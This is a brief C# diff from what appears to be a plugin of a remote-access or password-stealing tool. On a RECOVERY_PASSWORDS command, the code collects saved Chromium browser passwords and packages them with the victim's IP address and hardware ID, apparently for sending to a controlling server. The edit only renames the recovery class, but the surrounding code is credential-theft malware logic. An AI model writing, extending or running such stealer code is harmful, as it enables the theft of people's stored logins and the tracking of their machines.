@@ -20,7 +20,7 @@ namespace Plugin
             switch (loadingAPI.currentPacket.packetType)
             {
                 case PacketType.RECOVERY_PASSWORDS:
-                    PasswordsPacket passwordsPacket = new PasswordsPacket(Chromium.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
+                    PasswordsPacket passwordsPacket = new PasswordsPacket(ChromiumRecovery.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
                     while (!clientHandler.Connected)
                         Thread.Sleep(1000);
 
